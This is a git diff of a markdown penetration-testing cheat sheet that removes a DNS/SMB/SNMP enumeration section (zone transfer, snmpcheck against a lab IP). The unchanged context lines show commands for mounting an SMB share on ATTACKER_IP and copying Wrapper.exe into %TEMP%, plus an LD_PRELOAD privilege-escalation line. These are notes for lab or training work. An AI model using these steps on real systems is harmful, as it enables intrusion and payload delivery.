@@ -14,7 +14,6 @@
   - [Executables](#executables)
     - [Finding Important Files](#finding-important-files)
 - [Uploading Files](#uploading-files)
-  - [DNS, SMB, SNMP](#dns-smb-snmp)
 - [Searchexploit](#searchexploit)
 - [Code Analyse](#code-analyse)
 - [METASPLOIT](#metasploit)
@@ -296,18 +295,6 @@ LD_PRELOAD=root.so executable restart
   -  create client: net use \\ATTACKER_IP\share /USER:user s3cureP@ssword
   -  upload file: copy \\ATTACKER_IP\share\Wrapper.exe %TEMP%\wrapper-USERNAME.exe
   -  smbclient -U USER '//IP/folder'
-
-## DNS, SMB, SNMP
-- dig
-  - -t AXFR DOMAIN_NAME @DNS_Server = zone transfer
-- SMB
-  - Server Message Bloc
-  - net share
-
-- SNMP
-  - Simple Network Management Protocol
-  - snmpcheck
-  - /opt/snmpcheck/snmpcheck.rb 10.10.84.238 -c COMMUNITY_STRING.
 
 # Searchexploit
 - m = copie
